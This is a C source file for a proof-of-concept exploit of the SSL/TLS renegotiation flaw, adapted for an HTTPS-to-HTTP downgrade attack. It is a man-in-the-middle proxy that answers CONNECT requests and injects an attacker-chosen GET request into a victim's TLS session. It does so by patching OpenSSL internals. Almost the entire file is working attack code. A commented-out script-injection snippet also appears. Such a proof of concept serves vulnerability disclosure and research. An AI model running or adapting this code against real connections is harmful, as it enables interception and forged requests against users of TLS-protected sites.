#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/ssl3.h>

// Original POC by Pavel Kankovsky aka Peak 
// Modified by Thierry Zoller for HTTPS to HTTP downgrade attack POC
// http://www.g-sec.lu/ 
// More information about the underlying vulnerability : http://www.g-sec.lu/practicaltls.pdf
//
// Compile : gcc -lssl ssl-302-inp.c -o ssl-302
// Use : ./ssl-302 PORT URLTOINJECT
// Example: ./ssl-302 8080 /search/redir.php
//
// Note: This POC only performs the first step, injecting the required GET into an HTTP request.
// This request triggers the 302 that is then followed by the client. That request then needs
// to be rewritten to SSLstrip. Not included in this POC.


void
fail(const char *proc)
{
  perror(proc);
  exit(1);
}

void
setup_server
    (int *sock, int port)
{
  struct sockaddr_in sa;
  int s, r, i;

  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s == -1)
    fail("setup_server:socket");
  i = 1;
  r = setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &i, sizeof(i));
  if (r == -1)
    fail("setup_server:setsockopt(SO_REUSEADDR)");
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = INADDR_ANY;
  sa.sin_port = htons(port);
  r = bind(s, (struct sockaddr *) &sa, sizeof(sa));
  if (r == -1)
    fail("setup_server:bind");
  r = listen(s, 5);
  if (r == -1)
    fail("setup_server:listen");
  *sock = s;
}

void
do_accept
    (int *accepted, int sock)
{
  struct sockaddr_in sa;
  socklen_t sl;
  int s;

  sl = sizeof(sa);
  s = accept(sock, (struct sockaddr *) &sa, &sl);
  if (s == -1)
    fail("do_accept:accept");
  fprintf(stderr, "accepted %s:%d\n",
	  inet_ntoa(sa.sin_addr), ntohs(sa.sin_port));
  *accepted = s;
}

void
setup_client
    (int *sock, in_addr_t ip, int port)
{
  struct sockaddr_in sa;
  int s, r;

  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s == -1)
    fail("setup_server:socket");
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = ip;
  sa.sin_port = htons(port);
  r = connect(s, (struct sockaddr *) &sa, sizeof(sa));
  if (r == -1)
    fail("setup_client:connect");
  *sock = s;
}

int
xread
    (int fd, unsigned char *buf, size_t len)
{
  int r, rlen;

  rlen = 0;
  while (len > 0) {
    r = read(fd, buf, len);
    if (r == 0)
      break;
    else if (r == -1)
      return -1;
    buf += r;
    len -= r;
    rlen += r;
  }
  return rlen;
}

struct ssl_io_t
{
  SSL *ssl;
  int fd;
  int raw;
};

extern int
ssl3_read_bytes
    (SSL *s, int type, unsigned char *buf, int len, int peek);

int
rec_read
    (struct ssl_io_t *io, unsigned char *buf)
{
  int r, l;

#if 0
  fprintf(stderr, "rec read %s\n",
	  io->raw & 1 ? "raw" : "cooked");
#endif
  if (io->raw & 1) {
    r = xread(io->fd, buf, 5);
    if (r == 0)
      return 0;
    else if (r != 5)
      fail("rec_read:read1");
    if (buf[0] != 0x80)
      l = (buf[3] << 8) + buf[4];
    else /* ssl2 hack */
      /* fail("rec_read:ssl2"); */
      l = (buf[1]) - 3;
    if (l < 0 || l > (1 << 15)) {
      errno = EINVAL;
      fail("rec_read:reclen");
    }
    r = xread(io->fd, buf + 5, l);
    if (r != l)
      fail("rec_read:read2");
    l += 5;
    return l;
  }
  else {
    r = ssl3_read_bytes(io->ssl, SSL3_RT_HANDSHAKE, buf + 5, 1<<15, 0);
    if (r == 0)
      return 0;
    else if (r < 0) {
      if (io->ssl->s3->change_cipher_spec) {
	buf[0] = 0x14;
	buf[1] = (io->ssl->version >> 8);
	buf[2] = (io->ssl->version & 0xff);
	buf[3] = 0;
	buf[4] = 1;
	buf[5] = 1;
	io->raw |= 1;
	io->ssl->s3->change_cipher_spec = 0;
	return 6;
      }
      fail("rec_read:ssl3_read_bytes");
    }
    l = r;
    buf[0] = io->ssl->s3->rrec.type;
    buf[1] = (io->ssl->version >> 8);
    buf[2] = (io->ssl->version & 0xff);
    buf[3] = (l >> 8);
    buf[4] = (l & 0xff);
    return l + 5;
  }
}

extern int
ssl3_write_bytes
    (SSL *s, int type, const void *buf_, int len);

void
rec_write
    (struct ssl_io_t *io, unsigned char *buf, size_t len)
{
  int r;

#if 0
  fprintf(stderr, "rec write %s\n",
	  io->raw & 2 ? "raw" : "cooked");
#endif
  if (io->raw & 2) {
    r = write(io->fd, buf, len);
    if (r != len)
      fail("rec_write:write");
  }
  else {
    r = ssl3_write_bytes(io->ssl, buf[0], buf + 5, len - 5);
    if (r < 0) {
      fail("rec_read:ssl3_write_bytes");
    }
    if (buf[0] == 0x14) {
      io->raw |= 2;
    }
  }
}

void
ssl_io
    (struct ssl_io_t *assl, struct ssl_io_t *cssl)
{
  struct ssl_io_t *ssls[2];
  int maxfd, active;
  int i, r, l;
  fd_set rfd;
  unsigned char buf[1 << 16];

  ssls[0] = assl;
  ssls[1] = cssl;
  active = 3;
  maxfd = 0;
  for (i = 0; i < 2; i++)
    if (ssls[i]->fd >= maxfd)
      maxfd = ssls[i]->fd + 1;

  while (active) {
    FD_ZERO(&rfd);
    for (i = 0; i < 2; i++)
      if (active & (1 << i))
	FD_SET(ssls[i]->fd, &rfd);
    r = select(maxfd, &rfd, NULL, NULL, NULL);
    if (r == -1)
      fail("rec_io:select");
    for (i = 0; i < 2; i++) {
      if (active & (1 << i) && FD_ISSET(ssls[i]->fd, &rfd)) {
	r = rec_read(ssls[i], buf);
	if (r == 0) {
	  shutdown(ssls[i]->fd, SHUT_RD);
	  shutdown(ssls[1 - i]->fd, SHUT_WR);
	  active &= ~(1 << i);
	  continue;
	}
	l = r;
	rec_write(ssls[1 - i], buf, l);
      }
    }
  }
}

void
setup_ssl_ctx
    (SSL_CTX **ctx)
{
  OpenSSL_add_ssl_algorithms();
  SSL_load_error_strings();
  *ctx = SSL_CTX_new(SSLv3_client_method());
  if (!*ctx)
    fail("setup_ssl_ctx:SSL_CTX_new");
}

void
setup_ssl_io
    (struct ssl_io_t *io, SSL_CTX *ctx, int sock, int raw)
{
  SSL *ssl;
  BIO *bio;

  ssl = SSL_new(ctx);
  if (!ssl)
    fail("setup_ssl_ctx:SSL_new");
  bio = BIO_new_socket(sock, BIO_NOCLOSE);
  if (!bio)
    fail("setup_ssl_ctx:BIO_new_socket");
  SSL_set_bio(ssl, bio, bio);
  SSL_set_connect_state(ssl);
  io->ssl = ssl;
  io->fd = sock;
  io->raw = raw;
}

int
bogus_change_cipher_state
    (SSL *ssl, int i)
{
  return 0;
}

/* stolen from ssl_locl.h */
typedef struct ssl3_enc_method {
  int (*enc)(SSL *, int);
  int (*mac)(SSL *, unsigned char *, int);
  int (*setup_key_block)(SSL *);
  int (*generate_master_secret)(SSL *, unsigned char *, unsigned char *, int);
  int (*change_cipher_state)(SSL *, int);
  int (*final_finish_mac)(SSL *, EVP_MD_CTX *, EVP_MD_CTX *, const char *, int, unsigned char *);
  int finish_mac_length;
  int (*cert_verify_mac)(SSL *, EVP_MD_CTX *, unsigned char *);
  const char *client_finished_label;
  int client_finished_label_len;
  const char *server_finished_label;
  int server_finished_label_len;
  int (*alert_value)(int);
} SSL3_ENC_METHOD;



void
hack_ssl
    (struct ssl_io_t *assl, struct ssl_io_t *cssl, char *trick)
{
  int r, l;
  unsigned char buf[1 << 16];
  SSL_METHOD *mth;

  r = rec_read(assl, buf);
  if (r <= 0)
    fail("hack_ssl:rec_read:no i/o");
  l = r;

  if (buf[0] == 0x16 && buf[1] == 3 &&
      (buf[2] == 0 || buf[2] == 1)) {
    cssl->raw = 0;
    r = SSL_CTX_set_ssl_version
	(cssl->ssl->ctx, buf[2] == 0 ?
	 SSLv3_client_method() : TLSv1_client_method());
    if (r != 1)
      fail("hack_ssl:SSL_CTX_set_ssl_version");
    r = SSL_clear(cssl->ssl);
    if (r != 1)
      fail("hack_ssl:SSL_clear");
    r = SSL_connect(cssl->ssl);
    if (r != 1)
      fail("hack_ssl:SSL_connect");
    /* ssl3_setup_buffers(io->ssl);
       ssl_get_new_session(io->ssl, 0); */

    r = SSL_write(cssl->ssl, trick, strlen(trick));
    if (r != strlen(trick))
      fail("hack_ssl:SSL_connect");
    cssl->ssl->in_handshake++;
    cssl->ssl->method->ssl3_enc->change_cipher_state =
	bogus_change_cipher_state;
  }
  else {
    /* schedule suicide */
    alarm(5);
  }

  rec_write(cssl, buf, l);
}

#define HTTP_OK "HTTP/1.0 200 Connected\r\n\r\n"

void
handle_http_req
    (int sock, in_addr_t *ip, int *port)
{
  int r, l, k;
  unsigned char buf[1 << 16];
  char str[100];
  unsigned short num;
  struct hostent *he;

  l = 0;
  for (;;) {
    r = read(sock, buf + l, sizeof(buf)-1 - l);
    if (r <= 0)
      fail("handle_http_req:read");
    for (k = l; r > 0; ++k, --r)
      if (buf[k] != '\r')
        buf[l++] = buf[k];
    if (l >= 2 && buf[l-1] == '\n' && buf[l-2] == '\n')
      break;
    if (l >= sizeof(buf)-1)
      fail("handle_http_req:req too big");
  }
  
  buf[l] = '\0';
  r = sscanf(buf, "CONNECT %99[0-9A-Za-z.-]:%hu", str, &num);
  if (r != 2)
    fail("handle_http_req:bad request");
  he = gethostbyname(str);
  if (he == NULL || he->h_length != sizeof(in_addr_t))
    fail("handle_http_req:gethostbyname");

  r = write(sock, HTTP_OK, sizeof(HTTP_OK)-1);
  if (r != sizeof(HTTP_OK)-1)
    fail("handle_http_req:write");

  *ip = *(in_addr_t *)(he->h_addr_list[0]);
  *port = num;
}

//<HTML><script>alert('echo')</SCRIPT></HTML>
//  "Accept: */*\r\n"\
//  "User-Agent: curl/7.18.2 (i486-pc-linux-gnu) libcurl/7.18.2 OpenSSL/0.9.8g zlib/1.2.3.3 libidn/1.8\r\n"\
//  "Content-Length: 147\r\n"\
//  "Content-Type: application/x-www-form-urlencoded\r\n\r\n"\

#define TRICK \
  "GET /%s HTTP/1.0\r\n" \
  "X-IGNORE:"
int
main
    (int argc, const char **argv)
{
  pid_t pid;
  int ssock, asock, csock;
  SSL_CTX *ctx;
  in_addr_t ip;
  int port;
  struct ssl_io_t assl, cssl;
  char *trick;

  if (argc < 3) return 1;
  trick = malloc(sizeof(TRICK)-1+strlen(argv[2])); 
  snprintf(trick, sizeof(TRICK)-1+strlen(argv[2]), TRICK, argv[2]);
  setup_ssl_ctx(&ctx);
  setup_server(&ssock, atoi(argv[1]));
  for (;;) {
    do_accept(&asock, ssock);
    pid = fork();
    if (pid == -1)
      fail("main:fork");
    else if (pid == 0) {
      close(ssock);
      handle_http_req(asock, &ip, &port);
      setup_client(&csock, ip, port);
      setup_ssl_io(&assl, ctx, asock, 3);
      setup_ssl_io(&cssl, ctx, csock, 3);
      hack_ssl(&assl, &cssl, trick);
      ssl_io(&assl, &cssl);
      return 0;
    }
    else {
      close(asock);
    }
  }
}
